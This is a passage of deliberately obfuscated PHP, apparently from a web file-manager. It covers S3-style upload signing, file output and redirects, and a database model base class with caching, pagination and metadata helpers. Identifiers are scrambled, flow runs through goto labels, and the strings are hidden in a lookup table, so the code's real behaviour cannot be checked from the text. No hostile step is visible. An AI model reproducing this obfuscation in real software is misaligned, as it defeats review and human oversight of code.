dÎéİ·—; DÍ©íĞš„: $Fˆ´”â÷¤™ = $Dğöò…ˆ’À[226]; $F‡ÔôÏ‡Œ‚ = $Dğöò…ˆ’À[8] . $this->pathEncode($d½—“ö®Ùí) . $Bœ‰ƒÚÏ…; $eİ‰§µÊ¦Ó = $this->client->__getSignatureV4($d×ë„¸©‹˜, $båøºƒòô¥, $Fˆ´”â÷¤™, $F‡ÔôÏ‡Œ‚); goto e‚ô§İØØ„; dĞâôÂ¯¶…: unset($A¶ÖøæÀáâ[$Dğöò…ˆ’À[93]]); if (isset($A¶ÖøæÀáâ[$Dğöò…ˆ’À[223]])) { return $this->listUploadParts($d½—“ö®Ùí, $A¶ÖøæÀáâ); } $d×ë„¸©‹˜ = array(); goto DòĞÂ¡ƒÅ; e‚ô§İØØ„: if (strpos($Bœ‰ƒÚÏ…, $Dğöò…ˆ’À[225]) === 0) { if (isset($d×ë„¸©‹˜[$Dğöò…ˆ’À[1322]])) { $D‡ÓâÄ¦¬¡ = $d×ë„¸©‹˜[$Dğöò…ˆ’À[1322]]; } else { if (isset($eİ‰§µÊ¦Ó[$Dğöò…ˆ’À[1322]])) { $D‡ÓâÄ¦¬¡ = $eİ‰§µÊ¦Ó[$Dğöò…ˆ’À[1322]]; } else { $D‡ÓâÄ¦¬¡ = hash($Dğöò…ˆ’À[1235], $Dğöò…ˆ’À[33]); } } return array($Dğöò…ˆ’À[232] => $eİ‰§µÊ¦Ó[$Dğöò…ˆ’À[232]], $Dğöò…ˆ’À[1322] => $D‡ÓâÄ¦¬¡, $Dğöò…ˆ’À[222] => $eİ‰§µÊ¦Ó[$Dğöò…ˆ’À[1325]]); } return $eİ‰§µÊ¦Ó[$Dğöò…ˆ’À[232]]; goto fŞæë¼éçè; dÎéİ·—: $Dğöò…ˆ’À =& $_SERVER[«¾°Ã¤]; $Bœ‰ƒÚÏ… = isset($A¶ÖøæÀáâ[$Dğöò…ˆ’À[168]]) ? $A¶ÖøæÀáâ[$Dğöò…ˆ’À[168]] : $Dğöò…ˆ’À[33]; $d½—“ö®Ùí = $A¶ÖøæÀáâ[$Dğöò…ˆ’À[93]]; goto dĞâôÂ¯¶…; DòĞÂ¡ƒÅ: if (isset($A¶ÖøæÀáâ[$Dğöò…ˆ’À[1321]])) { $d×ë„¸©‹˜[$Dğöò…ˆ’À[1322]] = $A¶ÖøæÀáâ[$Dğöò…ˆ’À[1321]]; } $f‹æÑ = explode($Dğöò…ˆ’À[177], $this->getHost()); $båøºƒòô¥ = array($Dğöò…ˆ’À[1323] => $f‹æÑ[1], $Dğöò…ˆ’À[1324] => $Dğöò…ˆ’À[33], $Dğöò…ˆ’À[211] => $Dğöò…ˆ’À[119], $Dğöò…ˆ’À[1237] => $A¶ÖøæÀáâ[$Dğöò…ˆ’À[78]]); goto DÍ©íĞš„; fŞæë¼éçè: } public function listUploadParts($e×Ş“Èìõ, $a¤Ã›“¸¨‹ = array()) { goto Dœõ…Í‹ÈÄ; AÓ¦õ·ÆŒÒ: if (!$AåöÃ§Õé) { return !1; } $aë¢“éÆíã = $b®‰×ë¹²½[1326]; foreach ($AåöÃ§Õé as $cƒ•ÂãàÌ) { $aë¢“éÆíã .= $b®‰×ë¹²½[1327] . "\74\120\141\162\164\116\x75\x6d\142\x65\162\76{$cƒ•ÂãàÌ[$b®‰×ë¹²½[1282]]}\74\x2f\x50\141\x72\x74\x4e\165\155\x62\x65\x72\76\12" . "\74\x45\124\x61\x67\x3e{$cƒ•ÂãàÌ[$b®‰×ë¹²½[1283]]}\x3c\x2f\105\x54\141\147\76\xa" . $b®‰×ë¹²½[1328]; } goto D˜¡…·¡‡·; D˜¡…·¡‡·: $aë¢“éÆíã .= $b®‰×ë¹²½[1329]; $BÚİÄ„âùæ = array(); $dæåÀÏÑ = explode($b®‰×ë¹²½[177], $this->getHost()); goto bÂ¾«Ò¸°; dÃòãÙ×¨Œ: $Fà…¥™œÄ” = $this->client->__getSignatureV4($BÚİÄ„âùæ, $F¡Æ§‘‰”ï, $bÖ×ñˆ×—, $D­£‰±Ğ®ì, $aë¢“éÆíã); return array($b®‰×ë¹²½[232] => $Fà…¥™œÄ”[$b®‰×ë¹²½[232]], $b®‰×ë¹²½[222] => $Fà…¥™œÄ”[$b®‰×ë¹²½[1325]], $b®‰×ë¹²½[234] => $AåöÃ§Õé, $b®‰×ë¹²½[1322] => $Fà…¥™œÄ”[$b®‰×ë¹²½[1322]]); goto EÀ“Ø’¶Ù—; bÂ¾«Ò¸°: $F¡Æ§‘‰”ï = array($b®‰×ë¹²½[1323] => $dæåÀÏÑ[1], $b®‰×ë¹²½[211] => $b®‰×ë¹²½[119], $b®‰×ë¹²½[1237] => strlen($aë¢“éÆíã)); $bÖ×ñˆ×— = $b®‰×ë¹²½[224]; $D­£‰±Ğ®ì = $b®‰×ë¹²½[8] . $this->pathEncode($e×Ş“Èìõ) . $a¤Ã›“¸¨‹[$b®‰×ë¹²½[168]]; goto dÃòãÙ×¨Œ; Dœõ…Í‹ÈÄ: $b®‰×ë¹²½ =& $_SERVER[«¾°Ã¤]; $dªÄïÆ¯ÕÙ = str_replace($b®‰×ë¹²½[233], $b®‰×ë¹²½[33], $a¤Ã›“¸¨‹[$b®‰×ë¹²½[168]]); $AåöÃ§Õé = $this->client->listParts($this->bucket, $e×Ş“Èìõ, $dªÄïÆ¯ÕÙ); goto AÓ¦õ·ÆŒÒ; EÀ“Ø’¶Ù—: } public function link($EñÂÁ±’¡š, $D¸“îÇø‘Š = array()) { return parent::link($EñÂÁ±’¡š, $D¸“îÇø‘Š); } public function fileOut($Føİó‘½É…, $bï¾õ’ˆÊ = false, $C’Àƒôó¯ = false, $d†÷šù…²š = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[«¾°Ã¤][1330])) { return parent::fileOutServer($Føİó‘½É…, $bï¾õ’ˆÊ, $C’Àƒôó¯, $d†÷šù…²š); } parent::fileOut($Føİó‘½É…, $bï¾õ’ˆÊ, $C’Àƒôó¯, $d†÷šù…²š); } public function fileOutImage($E½ÇØ¥¾¬È, $F¸â‚Âêšô = 250) { if (strstr($this->endpoint, $_SERVER[«¾°Ã¤][1330])) { return parent::fileOutImageServer($E½ÇØ¥¾¬È, $F¸â‚Âêšô); } parent::fileOutImage($E½ÇØ¥¾¬È, $F¸â‚Âêšô); } public function fileOutLink($bœ•è†Ó›) { $EËÇïÈè” =& $_SERVER[«¾°Ã¤]; if (substr($bœ•è†Ó›, 0, 7) == $EËÇïÈè”[1205]) { $bœ•è†Ó› = $EËÇïÈè”[1206] . substr($bœ•è†Ó›, 7); } header($EËÇïÈè”[159] . $bœ•è†Ó›); die; } public function getHost() { $eŒ’øÊŠÓê =& $_SERVER[«¾°Ã¤]; $AµŞÜ”ñá = str_rtrim(parent::getHost(), $eŒ’øÊŠÓê[8] . $this->bucket); $AµŞÜ”ñá = explode($eŒ’øÊŠÓê[177], $AµŞÜ”ñá); return $AµŞÜ”ñá[0] . $eŒ’øÊŠÓê[177] . $this->bucket . $eŒ’øÊŠÓê[95] . $AµŞÜ”ñá[1]; } } goto c¿¯Â†×çŸ; Bˆ®ß„³Í: class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\157\x64\x69\x66\171\x54\x69\155\x65", "\164\151\155\145", "\151\x6e\163\145\x72\164\54\x75\160\144\141\x74\x65", "\x66\165\x6e\x63\164\151\x6f\x6e"), array("\x63\162\145\x61\164\145\124\x69\x6d\x65", "\x74\151\x6d\145", "\151\x6e\163\x65\162\x74", "\x66\x75\x6e\143\164\x69\157\156")); public function setDataAuto($EŸí‘â°…Û) { $this->dataAuto = $EŸí‘â°…Û; } public function __construct($A‹×óàó¯ = '', $e‡¯Ä÷‹†ê = '', $D˜Í–ˆæâ‹ = '') { parent::__construct($A‹×óàó¯, $e‡¯Ä÷‹†ê, $D˜Í–ˆæâ‹); } public static function textEncode($DÄ‰Ã÷‚Œµ) { if (!$DÄ‰Ã÷‚Œµ) { return $DÄ‰Ã÷‚Œµ; } $aƒ·æè´İ™ = json_encode($DÄ‰Ã÷‚Œµ); $aƒ·æè´İ™ = preg_replace_callback($_SERVER[«¾°Ã¤][353], function ($DšÁ–ÚÛÚ—) { return addslashes($DšÁ–ÚÛÚ—[0]); }, $aƒ·æè´İ™); return json_decode($aƒ·æè´İ™); } public static function textDecode($Bæ¤ˆ‚ÌÎë) { $BÄÎ… ’‰ñ =& $_SERVER[«¾°Ã¤]; $Fœß±®äµØ = json_encode($Bæ¤ˆ‚ÌÎë); $Fœß±®äµØ = preg_replace_callback($BÄÎ… ’‰ñ[354], function ($aå×…½Œ¾¿) { return $_SERVER[«¾°Ã¤][97]; }, $Fœß±®äµØ); return json_decode($Fœß±®äµØ); } protected $tableMeta = array(); protected function _beforeInsert(&$cæ—’é°ù‰, $CÃÍ‡å±Ü) { $AÓ”ÔŠ¼« =& $_SERVER[«¾°Ã¤]; if (!$this->checkDataAutoHas($AÓ”ÔŠ¼«[355])) { return; } $this->dataBeforeFilter($cæ—’é°ù‰, $AÓ”ÔŠ¼«[355]); } protected function _beforeUpdate(&$F·ãÊÖ¼áâ, $FØ¤¸Á×éõ) { $cÑ‹£Àñ =& $_SERVER[«¾°Ã¤]; if (!$this->checkDataAutoHas($cÑ‹£Àñ[356])) { return; } $this->dataBeforeFilter($F·ãÊÖ¼áâ, $cÑ‹£Àñ[356]); } protected function _afterSelect(&$fîŸÊ»Ùª…, $BÅ¼à½¶ê) { if (!is_array($fîŸÊ»Ùª…)) { return; } if (!$this->checkDataAutoHas($_SERVER[«¾°Ã¤][357])) { return; } foreach ($fîŸÊ»Ùª… as &$eÏßßÑ‘·¡) { $this->dataAfterFilter($eÏßßÑ‘·¡); } unset($eÏßßÑ‘·¡); } protected function _afterFind(&$E¶„Ó–ŒÛµ, $e´§°»Ù‡¹) { if (!is_array($E¶„Ó–ŒÛµ)) { return; } if (!$this->checkDataAutoHas($_SERVER[«¾°Ã¤][357])) { return; } $this->dataAfterFilter($E¶„Ó–ŒÛµ); } public function setAutoIncrement($d‚Æ×Õí–) { $Bª¹êÊ³× = array($this->getPk() => $d‚Æ×Õí–); $D¿ìÕà­ë = $this->data($Bª¹êÊ³×)->add(); if ($D¿ìÕà­ë) { $this->delete($D¿ìÕà­ë); } } public function getAutoIncrement() { $c‹é©Ğ¯š = $this->getTableName(); $bõÖª†Œ¤¬ = $this->max($this->getPk()); $F¹ÓÁ¶ „ = $this->query("\163\x68\157\x77\x20\x74\x61\142\x6c\145\x20\163\164\x61\164\x75\x73\x20\167\150\x65\x72\x65\40\x4e\141\x6d\145\x3d\47{$c‹é©Ğ¯š}\x27"); $c¹ˆ°¥ª¸½ = $F¹ÓÁ¶ „[0][$_SERVER[«¾°Ã¤][358]]; $c¢¥«‹‘¿ˆ = max($bõÖª†Œ¤¬, $c¹ˆ°¥ª¸½); return $c¢¥«‹‘¿ˆ; } protected function _callBefore($a™ÁÓîË¼, $eˆŠ¿ÁÁ˜Á) { return $this->cacheCallCheck($a™ÁÓîË¼, $eˆŠ¿ÁÁ˜Á, !1); } protected function _callAfter($dÛ©ò¾ç¾Ğ, $a¬¯£Å˜‹) { return $this->cacheCallCheck($dÛ©ò¾ç¾Ğ, $a¬¯£Å˜‹, !0); } protected function cacheFunctionAlias($C¥ÔÛ‚ãë„) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($FÂÈ±áã´ï, $FÍŞÙ«•„, $Eë¶šŒÈÜ² = false) { $a‹‡ëŸÂÇ = $this->cacheFunctionAlias($FÍŞÙ«•„); if (!$a‹‡ëŸÂÇ) { return; } foreach ($a‹‡ëŸÂÇ as $dºàŠ¯Â¯æ => $a§êôõšæ¸) { $Eßà²åù¶ = $a§êôõšæ¸[0]; $bÊ˜Šğœ¾ = explode($_SERVER[«¾°Ã¤][47], $a§êôõšæ¸[1]); if ($FÂÈ±áã´ï == $dºàŠ¯Â¯æ) { return $this->cacheFunctionGet($dºàŠ¯Â¯æ, $Eßà²åù¶); } if ($Eë¶šŒÈÜ² && in_array($FÂÈ±áã´ï, $bÊ˜Šğœ¾)) { $this->cacheFunctionClear($dºàŠ¯Â¯æ, $Eßà²åù¶); } } } public function cacheFunctionGet($FÇŒ½â¥œä, $D«¹Ä˜Åå‚) { $B§†–Œé· = $this->cacheKeyMake($FÇŒ½â¥œä, $D«¹Ä˜Åå‚); $dŒİµö¦Í = Cache::get($B§†–Œé·); if (!is_array($dŒİµö¦Í)) { $dŒİµö¦Í = call_user_func_array(array($this, $FÇŒ½â¥œä), array($D«¹Ä˜Åå‚, !0)); Cache::set($B§†–Œé·, $dŒİµö¦Í); } return $dŒİµö¦Í; } public function cacheFunctionClear($FĞá£Ì¨º, $f âœ³±×) { $aŒ°çÅê = $f âœ³±×; if (!is_array($f âœ³±×)) { $aŒ°çÅê = array($f âœ³±×); } foreach ($aŒ°çÅê as $D¨ºÖ¡¸ï ) { $A÷¡ÊÃ±ãÈ = $this->cacheKeyMake($FĞá£Ì¨º, $D¨ºÖ¡¸ï ); Cache::remove($A÷¡ÊÃ±ãÈ); } } private function cacheKeyMake($B±İ†£÷Ó, $C‘öœ ¿ØÏ) { $e‰½¦Å¸ =& $_SERVER[«¾°Ã¤]; return get_class($this) . $e‰½¦Å¸[71] . $B±İ†£÷Ó . $e‰½¦Å¸[359] . $C‘öœ ¿ØÏ; } protected function selectPageReset() { $f¿‡È¤ñî =& $_SERVER[«¾°Ã¤]; if (isset($GLOBALS[$f¿‡È¤ñî[360]])) { return; } $GLOBALS[$f¿‡È¤ñî[360]] = isset($GLOBALS[$f¿‡È¤ñî[7]][$f¿‡È¤ñî[361]]) ? $GLOBALS[$f¿‡È¤ñî[7]][$f¿‡È¤ñî[361]] : !1; $GLOBALS[$f¿‡È¤ñî[362]] = isset($GLOBALS[$f¿‡È¤ñî[7]][$f¿‡È¤ñî[351]]) ? $GLOBALS[$f¿‡È¤ñî[7]][$f¿‡È¤ñî[351]] : !1; $GLOBALS[$f¿‡È¤ñî[7]][$f¿‡È¤ñî[361]] = !1; $GLOBALS[$f¿‡È¤ñî[7]][$f¿‡È¤ñî[351]] = !1; } protected function selectPageRestore() { $F‡Ï„Û†› =& $_SERVER[«¾°Ã¤]; if (!isset($GLOBALS[$F‡Ï„Û†›[360]])) { return; } $GLOBALS[$F‡Ï„Û†›[7]][$F‡Ï„Û†›[361]] = $GLOBALS[$F‡Ï„Û†›[360]]; $GLOBALS[$F‡Ï„Û†›[7]][$F‡Ï„Û†›[351]] = $GLOBALS[$F‡Ï„Û†›[362]]; unset($GLOBALS[$F‡Ï„Û†›[360]]); unset($GLOBALS[$F‡Ï„Û†›[362]]); } protected function selectPage($e§„ñÌ¡Ê… = 200, $D·ñ®ÔöÉ = 1) { goto FšùÆ¥”Ø; fµ¹…¶¬ï‚: $bŒˆŠñÑº = 50000; $e§„ñÌ¡Ê… = isset($in[$c ¾ìˆ¿‡°[361]]) && $in[$c ¾ìˆ¿‡°[361]] ? $in[$c ¾ìˆ¿‡°[361]] : $e§„ñÌ¡Ê…; if ($e§„ñÌ¡Ê… === -1) { $in[$c ¾ìˆ¿‡°[361]] = !1; $bŒˆŠñÑº = 100000000; $e§„ñÌ¡Ê… = $bŒˆŠñÑº; } goto Eš¿¨È÷Æ ; Eš¿¨È÷Æ : $f·»Ì®º¶‰ = $C’øÁÕ²´; $f·»Ì®º¶‰[$c ¾ìˆ¿‡°[363]] = array(); $e§„ñÌ¡Ê… = intval($e§„ñÌ¡Ê…); goto E‰ª£øéÌ‹; E‰ª£øéÌ‹: $e§„ñÌ¡Ê… = $e§„ñÌ¡Ê… <= 5 ? 5 : ($e§„ñÌ¡Ê… >= $bŒˆŠñÑº ? $bŒˆŠñÑº : $e§„ñÌ¡Ê…); $D·ñ®ÔöÉ = intval(isset($in[$c ¾ìˆ¿‡°[351]]) && $in[$c ¾ìˆ¿‡°[351]] ? $in[$c ¾ìˆ¿‡°[351]] : $D·ñ®ÔöÉ); $D·ñ®ÔöÉ = $D·ñ®ÔöÉ <= 1 ? 1 : $D·ñ®ÔöÉ; goto bĞåÉ™í; FšùÆ¥”Ø: $c ¾ìˆ¿‡° =& $_SERVER[«¾°Ã¤]; global $in; $C’øÁÕ²´ = $this->optionsValue(); goto fµ¹…¶¬ï‚; FÚ“ø£‚ì÷: return $D³˜Ö¾·˜Ó; goto fŞæß¼‚ƒè; bĞåÉ™í: $d÷Û¥œÑğº = array(); $BÌ¢—º—² = 1; if ($D·ñ®ÔöÉ == 1 && $BÌ¢—º—²) { $this->optionsValue($C’øÁÕ²´); $d÷Û¥œÑğº = $this->page($D·ñ®ÔöÉ, $e§„ñÌ¡Ê…)->select(); $eõÊ¨çœª = is_array($d÷Û¥œÑğº) ? count($d÷Û¥œÑğº) : 0; if ($eõÊ¨çœª < $e§„ñÌ¡Ê…) { $F´åÛ‚ÙŠ = 1; } else { $this->optionsValue($f·»Ì®º¶‰); $eõÊ¨çœª = intval($this->count()); $F´åÛ‚ÙŠ = ceil($eõÊ¨çœª / $e§„ñÌ¡Ê…); } } else { $this->optionsValue($f·»Ì®º¶‰); $eõÊ¨çœª = intval($this->count()); $F´åÛ‚ÙŠ = ceil($eõÊ¨çœª / $e§„ñÌ¡Ê…); $D·ñ®ÔöÉ = $D·ñ®ÔöÉ >= $F´åÛ‚ÙŠ ? $F´åÛ‚ÙŠ : $D·ñ®ÔöÉ; $this->optionsValue($C’øÁÕ²´); $d÷Û¥œÑğº = $this->page($D·ñ®ÔöÉ, $e§„ñÌ¡Ê…)->select(); } goto fòÄÓéÛÁï; fòÄÓéÛÁï: if (!is_array($d÷Û¥œÑğº)) { $d÷Û¥œÑğº = array(); } if ($F´åÛ‚ÙŠ == 1) { $eõÊ¨çœª = count($d÷Û¥œÑğº); } $D³˜Ö¾·˜Ó = array($c ¾ìˆ¿‡°[364] => array($c ¾ìˆ¿‡°[365] => $eõÊ¨çœª, $c ¾ìˆ¿‡°[361] => $e§„ñÌ¡Ê…, $c ¾ìˆ¿‡°[351] => $D·ñ®ÔöÉ, $c ¾ìˆ¿‡°[366] => $F´åÛ‚ÙŠ), $c ¾ìˆ¿‡°[367] => $d÷Û¥œÑğº); goto FÚ“ø£‚ì÷; fŞæß¼‚ƒè: } protected function checkLength($fÕõ“‘è¬Ó, $c¿ÃÄç´ˆá = 0, $FçîÑÙÂÈ· = '') { $a·—„Å¼³ =& $_SERVER[«¾°Ã¤]; $c¿ÃÄç´ˆá = $c¿ÃÄç´ˆá ? $c¿ÃÄç´ˆá : 65536; if (!$fÕõ“‘è¬Ó || strlen($fÕõ“‘è¬Ó) < $c¿ÃÄç´ˆá) { return; } $FçîÑÙÂÈ· = $FçîÑÙÂÈ· ? $FçîÑÙÂÈ· . $a·—„Å¼³[68] : $a·—„Å¼³[33]; show_json($FçîÑÙÂÈ· . LNG($a·—„Å¼³[368]) . "\x28{$c¿ÃÄç´ˆá}\x29", !1); } protected function metaSet($A¦‹Å¦¯™í, $dê²İ ±ã = null, $ešã¡¨“¤ = null) { goto C‡¶ø°ØÕæ; dóƒÛ´¼ò: $D‘öµ»Ì¼¬ = $this->tableMeta[$EØìœ¸ÆŸ[370]]; $F’·ñ³›‰© = Model($D‘öµ»Ì¼¬); $eˆ¼ããÍÚé = array($c‘‹—°’Ò¥ => $A¦‹Å¦¯™í, $EØìœ¸ÆŸ[371] => $dê²İ ±ã); goto d‰š–Â»­Í; CÏÖìÁ««±: CacheLock::unlock($C‡Ş™™Òäå); return !0; goto A­†£ŠòÃî; d‰š–Â»­Í: if (is_null($dê²İ ±ã)) { return $F’·ñ³›‰©->where(array($c‘‹—°’Ò¥ => $A¦‹Å¦¯™í))->delete(); } if (is_null($ešã¡¨“¤) && is_string($dê²İ ±ã)) { return $F’·ñ³›‰©->where($eˆ¼ããÍÚé)->delete(); } $CÂˆ‚ÖÀ‡ = is_array($dê²İ ±ã) ? $dê²İ ±ã : array(); goto B‘¶ªì†˜³; B‘¶ªì†˜³: if (is_string($dê²İ ±ã)) { $CÂˆ‚ÖÀ‡[$dê²İ ±ã] = $ešã¡¨“¤; } $Eì“‘Âñ– = array(); foreach ($CÂˆ‚ÖÀ‡ as $f´‹»ÕİĞ¦ => $dòİ„¹˜ì) { $this->checkLength($dòİ„¹˜ì, !1, $D‘öµ»Ì¼¬ . $EØìœ¸ÆŸ[4] . $f´‹»ÕİĞ¦); $Eì“‘Âñ–[] = array($c‘‹—°’Ò¥ => $A¦‹Å¦¯™í, $EØìœ¸ÆŸ[93] => $f´‹»ÕİĞ¦, $EØìœ¸ÆŸ[372] => $dòİ„¹˜ì); } goto Fù–×¦° Ï; Fù–×¦° Ï: $C‡Ş™™Òäå = $EØìœ¸ÆŸ[373] . $this->tableMeta; CacheLock::lock($C‡Ş™™Òäå); $F’·ñ³›‰©->where(array($c‘‹—°’Ò¥ => $A¦‹Å¦¯™í))->addAll($Eì“‘Âñ–, array(), !0); goto CÏÖìÁ««±; C‡¶ø°ØÕæ: $EØìœ¸ÆŸ =& $_SERVER[«¾°Ã¤]; if (!$this->tableMeta || !$A¦‹Å¦¯™í) { return !1; } $c‘‹—°’Ò¥ = $this->tableMeta[$EØìœ¸ÆŸ[369]]; goto dóƒÛ´¼ò; A­†£ŠòÃî: } public function metaGet($b””î®ºÚù, $Dã¾¹“áİ = false) { goto F½¤Í‡Ö; F½¤Í‡Ö: $BŸ–‚¾Îö =& $_SERVER[«¾°Ã¤]; if (!$this->tableMeta) { return array(); } $FìÃÀîŸÓ‘ = $this->tableMeta[$BŸ–‚¾Îö[369]]; goto fù¡¦å´îä; e®š×çÉå×: $eÖµÎ‚íÑ = $Bñâ´Š->field($BŸ–‚¾Îö[374])->where($b¹ŒÇöŒ’Ğ)->select(); $eÖµÎ‚íÑ = array_to_keyvalue($eÖµÎ‚íÑ, $BŸ–‚¾Îö[93], $BŸ–‚¾Îö[372]); return $eÖµÎ‚íÑ; goto DÉèìŒå³µ; fù¡¦å´îä: $Bñâ´Š = Model($this->tableMeta[$BŸ–‚¾Îö[370]]); if ($Dã¾¹“áİ) { $b¹ŒÇöŒ’Ğ = array($FìÃÀîŸÓ‘ => $b””î®ºÚù, $BŸ–‚¾Îö[93] => $Dã¾¹“áİ); return $Bñâ´Š->where($b¹ŒÇöŒ’Ğ)->getField($BŸ–‚¾Îö[372]); } $b¹ŒÇöŒ’Ğ = array($FìÃÀîŸÓ‘ => $b””î®ºÚù); goto e®š×çÉå×; DÉèìŒå³µ: } private function checkDataAutoHas($eßâ“Ì‘ë“) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $c³†„ŸØÍ¿) { if (in_array($eßâ“Ì‘ë“, explode($_SERVER[«¾°Ã¤][47], $c³†„ŸØÍ¿[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$eá¨´Ö‘èî, $dÊ øÁ™Ü¶) { $a×›°´¥®Ï =& $_SERVER[«¾°Ã¤]; foreach ($this->dataAuto as $e°—ÆĞ¦ëØ) { $FøÈµ´¦ = $e°—ÆĞ¦ëØ[0]; if (!in_array($dÊ øÁ™Ü¶, explode($a×›°´¥®Ï[47], $e°—ÆĞ¦ëØ[2]))) { continue; } switch (trim($e°—ÆĞ¦ëØ[3])) { case $a×›°´¥®Ï[319]: case $a×›°´¥®Ï[320]: $CÓ„ïÊ ´– = $e°—ÆĞ¦ëØ[1]; $A½ïöì‰µ‹ = isset($e°—ÆĞ¦ëØ[4]) ? (array) $e°—ÆĞ¦ëØ[4] : array(); if ($CÓ„ïÊ ´– == $a×›°´¥®Ï[197] && array_key_exists($FøÈµ´¦, $eá¨´Ö‘èî)) { if (!$eá¨´Ö‘èî[$FøÈµ´¦]) { unset($eá¨´Ö‘èî[$FøÈµ´¦]); } break; } if (isset($eá¨´Ö‘èî[$FøÈµ´¦])) { array_unshift($A½ïöì‰µ‹, $eá¨´Ö‘èî[$FøÈµ´¦]); } if ($a×›°´¥®Ï[319] == $e°—ÆĞ¦ëØ[3]) { $eá¨´Ö‘èî[$FøÈµ´¦] = call_user_func_array($CÓ„ïÊ ´–, $A½ïöì‰µ‹); } else { $eá¨´Ö‘èî[$FøÈµ´¦] = call_user_func_array(array(&$this, $CÓ„ïÊ ´–), $A½ïöì‰µ‹); } break; case $a×›°´¥®Ï[271]: $eá¨´Ö‘èî[$FøÈµ´¦] = $eá¨´Ö‘èî[$e°—ÆĞ¦ëØ[1]]; break; case $a×›°´¥®Ï[292]: if (isset($eá¨´Ö‘èî[$FøÈµ´¦]) && !is_string($eá¨´Ö‘èî[$FøÈµ´¦])) { $eá¨´Ö‘èî[$FøÈµ´¦] = json_encode_force($eá¨´Ö‘èî[$FøÈµ´¦]); } break; case $a×›°´¥®Ï[321]: if ($eá¨´Ö‘èî[$FøÈµ´¦] === $a×›°´¥®Ï[33]) { unset($eá¨´Ö‘èî[$FøÈµ´¦]); } break; case $a×›°´¥®Ï[322]: $eá¨´Ö‘èî[$FøÈµ´¦] = $e°—ÆĞ¦ëØ[1]; default: break; } } if ($dÊ øÁ™Ü¶ == $a×›°´¥®Ï[355]) { $DºÌƒ’’Õé = strtolower($this->db->getDbType()); if (strpos($DºÌƒ’’Õé, $a×›°´¥®Ï[9]) !== 0) { return; } $c‰Š·ŒÈ = $this->field(!0)->fields; $Fˆ…ÒÌšÆ§ = $c‰Š·ŒÈ[$a×›°´¥®Ï[250]]; if (isset($c‰Š·ŒÈ[$a×›°´¥®Ï[249]])) { unset($Fˆ…ÒÌšÆ§[$c‰Š·ŒÈ[$a×›°´¥®Ï[249]]]); } foreach ($Fˆ…ÒÌšÆ§ as $DÃ‡ê”Œœ => $dÊ øÁ™Ü¶) { if (!isset($eá¨´Ö‘èî[$DÃ‡ê”Œœ])) { $eá¨´Ö‘èî[$DÃ‡ê”Œœ] = $a×›°´¥®Ï[33]; } } } } private function dataAfterFilter(&$BÜ·íœ™©í) { $dİîÎñÍ• =& $_SERVER[«¾°Ã¤]; foreach ($this->dataAuto as $Dİ£èæ×êˆ) { $BñÆµƒÃ¤ì = $Dİ£èæ×êˆ[0]; if (!in_array($dİîÎñÍ•[357], explode($dİîÎñÍ•[47], $Dİ£èæ×êˆ[2]))) { continue; } if (!isset($BÜ·íœ™©í[$BñÆµƒÃ¤ì])) { continue; } switch (trim($Dİ£èæ×êˆ[3])) { case $dİîÎñÍ•[319]: case $dİîÎñÍ•[320]: $A¡ãÎå¡Š£ = isset($Dİ£èæ×êˆ[4]) ? (array) $Dİ£èæ×êˆ[4] : array(); array_unshift($A¡ãÎå¡Š£, $BÜ·íœ™©í[$BñÆµƒÃ¤ì]); if ($dİîÎñÍ•[319] == $Dİ£èæ×êˆ[3]) { $BÜ·íœ™©í[$BñÆµƒÃ¤ì] = call_user_func_array($Dİ£èæ×êˆ[1], $A¡ãÎå¡Š£); } else { $BÜ·íœ™©í[$BñÆµƒÃ¤ì] = call_user_func_array(array(&$this, $Dİ£èæ×êˆ[1]), $A¡ãÎå¡Š£); } break; case $dİîÎñÍ•[271]: $BÜ·íœ™©í[$BñÆµƒÃ¤ì] = $BÜ·íœ™©í[$Dİ£èæ×êˆ[1]]; break; case $dİîÎñÍ•[292]: $F™â§ˆÙ“ñ = $BÜ·íœ™©í[$BñÆµƒÃ¤ì]; $BÜ·íœ™©í[$BñÆµƒÃ¤ì] = json_decode($F™â§ˆÙ“ñ, !0); if (is_null($BÜ·íœ™©í[$BñÆµƒÃ¤ì])) { $BÜ·íœ™©í[$BñÆµƒÃ¤ì] = $F™â§ˆÙ“ñ; } break; case $dİîÎñÍ•[321]: if ($BÜ·íœ™©í[$BñÆµƒÃ¤ì] === $dİîÎñÍ•[33]) { unset($BÜ·íœ™©í[$BñÆµƒÃ¤ì]); } break; case $dİîÎñÍ•[322]: $BÜ·íœ™©í[$BñÆµƒÃ¤ì] = $Dİ£èæ×êˆ[1]; default: break; } } } public function saveAll($fÒØº›šó) { goto EïöäÂ„—µ; EïöäÂ„—µ: $b‘¾›šƒâ =& $_SERVER[«¾°Ã¤]; $bË‰‘²¼æ¢ = $this->tablePrefix . $this->tableName; $DÄÒÛœ˜–Â = self::SQL_WHERE_IN_CHUNK; goto cã¸ù‡˜Î¼; eòÈ®ê‘: $this->chunkEventSet(); goto dõÀÌÈ”•¤; e´¼ø•ùÄ: $e™Ù¬× š = array(); $B°À™ç›Á = count($fÒØº›šó); for ($f¿ì†ªÚ¡Ş = 0; $f¿ì†ªÚ¡Ş < $B°À™ç›Á; $f¿ì†ªÚ¡Ş++) { $eÓ“ó˜ñšÃ = $fÒØº›šó[$f¿ì†ªÚ¡Ş]; if (!is_array($eÓ“ó˜ñšÃ) || count($eÓ“ó˜ñšÃ) != 4) { continue; } $Dä§¶È‚ïÚ = "\125\120\104\101\x54\x45\40\140{$bË‰‘²¼æ¢}\140\40\x53\105\x54\x20{$eÓ“ó˜ñšÃ[2]}\x20\75\x20\103\x41\x53\x45\x20{$eÓ“ó˜ñšÃ[0]}\40\xa"; if ($a¸Äé¯Ò¾ == 0) { $F¡Ä¬­İŒ× = $Dä§¶È‚ïÚ; } $e™Ù¬× š[] = $b‘¾›šƒâ[116] . $eÓ“ó˜ñšÃ[1] . $b‘¾›šƒâ[116]; $a¸Äé¯Ò¾++; $F¡Ä¬­İŒ× .= "\40\x57\x48\105\116\40\47{$eÓ“ó˜ñšÃ[1]}\47\x20\124\110\105\x4e\x20\47{$eÓ“ó˜ñšÃ[3]}\x27\x20\12"; if ($a¸Äé¯Ò¾ == $DÄÒÛœ˜–Â || $f¿ì†ªÚ¡Ş == $B°À™ç›Á - 1) { goto EçÜ¦Ùä¯’; 